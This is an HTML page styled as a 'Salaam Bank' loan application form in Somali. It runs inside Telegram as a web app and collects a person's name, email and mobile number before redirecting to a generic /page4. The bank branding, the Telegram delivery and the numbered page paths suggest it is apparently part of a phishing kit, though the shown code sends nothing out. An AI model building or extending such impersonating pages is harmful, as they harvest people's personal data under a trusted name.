<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Salaam Bank - Macluumaadka Shakhsiga</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bank-primary: #008751;
            --bank-hover: #006d41;
            --bg-color: #e5e5e5;
            --card-bg: #ffffff;
            --text-main: #000000;
            --text-muted: #888888;
            --input-border: #e2e8f0;
            --btn-gray: #e8e8e8;
            --btn-gray-text: #555555;
        }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .app-header { width: 100%; background-color: var(--bank-primary); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
        .back-btn-top { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; display: flex; align-items: center; gap: 5px; }
        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 20px; font-weight: 800; color: #ffffff; }
        .header-title .salaam { color: #ffd700; margin-right: 4px; }
        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); display: flex; flex-direction: column; }
        .main-title { font-size: 26px; color: var(--text-main); margin: 0 0 6px; text-align: center; font-weight: 800; }
        .subtext { font-size: 14px; color: var(--text-muted); text-align: center; margin-bottom: 20px; }
        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
        .step-bar.active { background-color: var(--bank-primary); }
        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
        .form-group label { font-size: 15px; font-weight: 700; color: #222222; margin-bottom: 10px; }
        .form-control { font-size: 15px; padding: 14px 16px; border: 1px solid var(--input-border); border-radius: 10px; background-color: #ffffff; color: #333333; outline: none; width: 100%; }
        .form-control:focus { border-color: var(--bank-primary); }
        .phone-group { display: flex; gap: 10px; }
        .country-prefix { display: flex; align-items: center; justify-content: center; gap: 6px; background-color: #f5f5f5; border: 1px solid var(--input-border); border-radius: 10px; padding: 0 14px; font-weight: 700; font-size: 15px; }
        .phone-hint { font-size: 12px; color: var(--text-muted); margin-top: 8px; }
        .btn-container { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
        .btn-prev { background-color: var(--btn-gray); color: var(--btn-gray-text); border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
        .btn-next { background-color: var(--bank-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 15px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666666; margin-top: auto; }
    </style>
</head>
<body>
<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← Noqo</a>
    <div class="header-title"><span class="salaam">Salaam</span> Bank</div>
    <div class="menu-icon" style="color:white; font-size:24px;">☰</div>
</div>

<div class="card">
    <h1 class="main-title">Codsiga Daynta</h1>
    <div class="subtext">Tallaabada 2 ee 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
    </div>

    <form id="step2Form" onsubmit="goNext(event)">
        <div class="form-group">
            <label for="firstName">Magaca Koowaad</label>
            <input type="text" id="firstName" class="form-control" placeholder="Maxamed" required>
        </div>

        <div class="form-group">
            <label for="lastName">Magaca Aabaha / Qoyska</label>
            <input type="text" id="lastName" class="form-control" placeholder="Cismaan" required>
        </div>

        <div class="form-group">
            <label for="email">Cinwaanka Email-ka</label>
            <input type="email" id="email" class="form-control" placeholder="maxamed.cismaan@example.so" required>
        </div>

        <div class="form-group">
            <label for="phone">Telefoonka Bangiga / Mobilka</label>
            <div class="phone-group">
                <div class="country-prefix"><span>🇸🇴</span><span>+252</span></div>
                <input type="tel" id="phone" class="form-control" placeholder="615123456" maxlength="9" pattern="[6][1-9][0-9]{7}" required>
            </div>
            <div class="phone-hint">9 lambar oo ka bilaabma 6 (tusaale: 615123456)</div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="goBack()">HOREE</button>
            <button type="submit" class="btn-next">TALLAABADA XIGTA</button>
        </div>
    </form>
</div>

<div class="footer-banner">© 2026 Salaam Bank Somalia</div>

<script>
    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) { tg.ready(); tg.expand(); }
        if (localStorage.getItem('firstName')) document.getElementById('firstName').value = localStorage.getItem('firstName');
        if (localStorage.getItem('lastName')) document.getElementById('lastName').value = localStorage.getItem('lastName');
        if (localStorage.getItem('email')) document.getElementById('email').value = localStorage.getItem('email');
        if (localStorage.getItem('phone')) document.getElementById('phone').value = localStorage.getItem('phone');
    };

    function goNext(event) {
        event.preventDefault();
        const fName = document.getElementById('firstName').value.trim();
        const lName = document.getElementById('lastName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!/^6[1-9]\d{7}$/.test(phone)) {
            alert("Fadlan geli lambar sax ah oo Soomaali ah (tusaale: 615XXXXXX).");
            return;
        }

        localStorage.setItem('firstName', fName);
        localStorage.setItem('lastName', lName);
        localStorage.setItem('email', email);
        localStorage.setItem('phone', phone);
        localStorage.setItem('userPhone', phone);

        window.location.href = "/page4";
    }

    function goBack() { window.location.href = "/page2"; }
</script>
</body>
</html>
